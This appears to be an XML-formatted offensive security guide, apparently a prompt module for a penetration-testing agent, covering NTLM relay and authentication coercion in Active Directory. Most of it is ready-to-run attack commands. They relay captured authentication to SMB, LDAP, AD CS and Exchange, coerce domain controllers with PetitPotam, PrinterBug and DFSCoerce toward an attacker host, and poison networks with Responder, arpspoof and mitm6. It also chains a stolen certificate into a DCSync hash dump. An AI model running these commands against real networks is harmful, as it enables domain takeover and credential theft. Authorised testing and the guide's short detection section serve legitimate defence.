<vulnerability_guide>
  <title>NTLM RELAY ATTACKS AND COERCED AUTHENTICATION</title>

  <critical>NTLM relay attacks intercept authentication attempts and relay them to another service, gaining unauthorized access without cracking the password. Combined with authentication coercion techniques (PetitPotam, PrinterBug, DFSCoerce), attackers can force high-privilege accounts to authenticate to attacker-controlled systems. This is one of the most powerful attack vectors in Active Directory.</critical>

  <scope>
    - SMB to SMB relay (when signing not required)
    - SMB to LDAP/LDAPS relay for AD modifications
    - SMB to HTTP relay (AD CS, Exchange, ADFS)
    - HTTP to SMB/LDAP relay
    - Cross-protocol relay attacks
    - Machine account authentication coercion
  </scope>

  <methodology>
    1. **Identify relay targets**: Find services without message signing
    2. **Set up relay server**: Configure ntlmrelayx or similar tool
    3. **Coerce authentication**: Trigger authentication from victim to attacker
    4. **Relay authentication**: Forward credentials to target service
    5. **Execute payload**: Leverage relayed session for access/modification
  </methodology>

  <advanced_techniques>
    <identify_relay_targets>
      Find vulnerable services:
      {% raw %}
      # Check SMB signing status
      crackmapexec smb targets.txt --gen-relay-list relay_targets.txt
      nmap -p445 --script smb2-security-mode 192.168.1.0/24

      # Check LDAP signing status
      crackmapexec ldap dc.domain.local -u user -p pass -M ldap-checker

      # Check AD CS HTTP endpoints
      crackmapexec smb dc.domain.local -u user -p pass -M adcs

      # Find DCs without LDAP signing enforced
      ldapsearch -x -H ldap://dc.domain.local -b "CN=Configuration,DC=domain,DC=local" "(objectClass=crossRef)"
      {% endraw %}
    </identify_relay_targets>

    <ntlm_relay_setup>
      Configure relay server:
      {% raw %}
      # Basic SMB relay
      ntlmrelayx.py -t smb://target -smb2support

      # Relay to multiple targets
      ntlmrelayx.py -tf targets.txt -smb2support

      # Relay to LDAP for user creation
      ntlmrelayx.py -t ldaps://dc.domain.local --add-computer

      # Relay to LDAP for delegation abuse
      ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

      # Relay to AD CS for certificate request
      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController

      # Relay to Exchange for privesc
      ntlmrelayx.py -t https://exchange.domain.local/EWS/Exchange.asmx

      # Execute command on relay
      ntlmrelayx.py -t smb://target -c "whoami > C:\\pwned.txt"
      {% endraw %}
    </ntlm_relay_setup>

    <authentication_coercion>
      Force victim to authenticate:
      {% raw %}
      # PetitPotam - EFS RPC coercion (unauthenticated on unpatched)
      PetitPotam.py attacker_ip target_dc
      PetitPotam.py -u user -p pass -d domain attacker_ip target_dc

      # PrinterBug - Print Spooler RPC
      SpoolSample.exe target_dc attacker_ip
      printerbug.py domain/user:pass@target_dc attacker_ip

      # DFSCoerce - DFS RPC
      dfscoerce.py -u user -p pass -d domain attacker_ip target_dc

      # ShadowCoerce - VSS RPC
      shadowcoerce.py -u user -p pass -d domain attacker_ip target_dc

      # WebDAV coercion
      # Create file \\attacker@80\share\file.txt and trick user into accessing

      # Coerce machine account via scheduled task
      schtasks /create /tn "Trigger" /tr "\\\\attacker\\share" /sc once /st 00:00 /s target
      {% endraw %}
    </authentication_coercion>

    <relay_to_adcs>
      AD Certificate Services relay (ESC8):
      {% raw %}
      # Identify vulnerable CA
      certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable

      # Set up relay to CA HTTP endpoint
      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController

      # Coerce DC authentication
      PetitPotam.py attacker_ip dc.domain.local

      # Use obtained certificate
      certipy auth -pfx dc.pfx
      # Results in NT hash of DC machine account

      # DCSync with machine account
      secretsdump.py -hashes :HASH domain/DC\$@dc.domain.local
      {% endraw %}
    </relay_to_adcs>

    <relay_to_ldap>
      LDAP relay for AD modifications:
      {% raw %}
      # Add computer account (for RBCD attack)
      ntlmrelayx.py -t ldaps://dc.domain.local --add-computer EVIL$ --computer-pass Password123

      # Delegate access to attacker computer
      ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access --escalate-user attacker

      # Modify ACLs (requires appropriate privileges on relayed account)
      ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user attacker

      # Shadow Credentials attack
      ntlmrelayx.py -t ldaps://dc.domain.local --shadow-credentials --shadow-target victim$
      {% endraw %}
    </relay_to_ldap>

    <webdav_relay>
      WebDAV-based relay attacks:
      {% raw %}
      # Check if WebDAV is enabled
      crackmapexec smb target -u user -p pass -M webdav

      # Start WebDAV server
      # Relay through WebDAV (works even with SMB signing)
      ntlmrelayx.py -t smb://target --no-http-server -smb2support

      # Coerce via WebDAV (bypasses SMB signing requirement)
      # Create shortcut or URL file pointing to \\attacker@80\share
      {% endraw %}
    </webdav_relay>

    <mitm_positioning>
      Position for MITM attacks:
      {% raw %}
      # Responder - capture and relay
      responder -I eth0 -wrf

      # LLMNR/NBT-NS poisoning
      responder -I eth0 -Pv

      # ARP spoofing for positioning
      arpspoof -i eth0 -t target gateway

      # IPv6 DNS takeover
      mitm6 -d domain.local
      ntlmrelayx.py -6 -t ldaps://dc.domain.local --delegate-access
      {% endraw %}
    </mitm_positioning>
  </advanced_techniques>

  <validation>
    - Successfully identify systems without SMB/LDAP signing
    - Coerce authentication from target machine
    - Relay authentication to vulnerable service
    - Demonstrate code execution or AD modification
    - Document impact (computer account creation, delegation, certificates)
  </validation>

  <false_positives>
    - SMB signing required - relay will fail
    - LDAP channel binding enforced
    - EPA (Extended Protection for Authentication) enabled
    - Machine account without exploitable privileges
    - Firewall blocking required ports
  </false_positives>

  <detection_indicators>
    - Event ID 4624 from unexpected source IPs
    - Authentication to CA web enrollment from DC machine accounts
    - Computer account creation without corresponding join
    - msDS-AllowedToActOnBehalfOfOtherIdentity modifications
    - Certificate enrollment for machine accounts via HTTP
  </detection_indicators>

  <pro_tips>
    - Domain Controllers authenticating to CA HTTP = Domain Admin via ESC8
    - WebDAV relay bypasses SMB signing requirement
    - mitm6 + ntlmrelayx is powerful in IPv6-enabled networks
    - Machine accounts often have more privileges than expected
    - Relay to LDAPS works even when LDAP signing is required (channel binding matters)
    - Shadow Credentials attack persists even after password change
    - RBCD (Resource-Based Constrained Delegation) via relay = persistent access
    - Check for Print Spooler enabled on DCs (often is, shouldn't be)
  </pro_tips>

  <remember>NTLM relay is powerful because it reuses the authentication without needing the password, and coercion techniques can force high-privilege machine accounts to authenticate to attacker-controlled systems.</remember>
</vulnerability_guide>
